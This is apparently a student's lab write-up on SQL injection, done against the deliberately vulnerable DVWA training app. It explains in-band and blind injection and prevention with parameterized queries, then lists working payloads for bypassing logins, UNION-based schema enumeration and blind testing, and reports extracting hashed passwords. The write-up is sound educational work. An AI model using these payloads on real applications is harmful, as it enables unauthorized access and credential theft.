# SQL Injection

## Objective
To understand how SQL injection vulnerabilities occur and how to exploit them to bypass authentication and extract data from a backend database.

## Theory & Concepts
- **SQL Injection (SQLi)**: A vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
- **In-band SQLi (Classic)**: The attacker uses the same communication channel to launch the attack and gather results (e.g., Error-based, Union-based).
- **Inferential SQLi (Blind)**: The attacker observes the application's response to different inputs to infer information (e.g., Boolean-based, Time-based).
- **Prevention**: Using prepared statements (parameterized queries) and input validation.

## Tools Used
- DVWA (Damn Vulnerable Web Application)
- Burp Suite
- SQLmap (optional but recommended)

## Commands & Practical Steps
- **Authentication Bypass**:
  - Input into Login: `' OR 1=1 --`
- **UNION-based Extraction**:
  - Find number of columns: `1' UNION SELECT 1,2 --`
  - Get database name: `1' UNION SELECT 1,database() --`
  - Get tables: `1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema='dvwa' --`
- **Blind SQLi (Manual)**:
  - `1' AND (SELECT 1)=1 --` (Check if response is true)

## Practical Demonstration Summary
Successfully bypassed the login page of DVWA using a simple SQL injection payload. Used UNION-based techniques to enumerate the database schema and extract user credentials (hashed passwords) from the `users` table.
